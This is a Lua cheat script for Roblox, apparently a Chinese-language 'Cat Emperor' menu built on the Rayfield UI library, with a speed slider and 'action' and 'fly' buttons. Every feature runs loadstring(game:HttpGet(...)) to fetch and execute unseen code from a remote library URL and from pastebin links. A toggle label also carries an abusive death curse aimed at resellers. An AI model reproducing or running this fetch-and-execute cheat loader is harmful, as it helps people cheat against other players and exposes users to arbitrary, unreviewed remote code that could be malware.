local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- 创建主窗口
local Window = Rayfield:CreateWindow({
    Name = "猫帝 脚本",
    LoadingTitle = "加载中...",
    LoadingSubtitle = "欢迎使用 猫帝脚本",
    ConfigurationSaving = {
        Enabled = false,
    },
})

-- 创建标签页
local Tab1 = Window:CreateTab("关于")
local Tab2 = Window:CreateTab("通用")
local Tab3 = Window:CreateTab("ohio")

-- 1. 切换开关(Toggle)示例
local ToggleExample = Tab1:CreateToggle({
    Name = "此脚本为缝合脚本完全免费倒卖的死全家",
    CurrentValue = false,
    Flag = "ToggleExample",
    Callback = function(Value)
        print("切换开关状态:", Value)
    end
})

-- 4. 滑块(Slider)示例
local SliderExample = Tab2:CreateSlider({
    Name = "speed研发中",
    Range = {0, 1000},
    Increment = 1,
    CurrentValue = 16,
    Flag = "SliderExample",
    Callback = function(Value)
        print("滑块值:", Value)
    end,
})

-- 6. 按钮(Button)示例
local ButtonExample = Tab2:CreateButton({
    Name = "动作",
    Callback = function()
        print("按钮被点击了!")
        loadstring(game:HttpGet("https://pastebin.com/raw/Zj4NnKs6"))()
    end,
})


local ButtonExample = Tab2:CreateButton({
    Name = "fly",
    Callback = function()
        print("按钮被点击了!")
        loadstring(game:HttpGet('https://pastebin.com/raw/U27yQRxS'))()
    end,
})


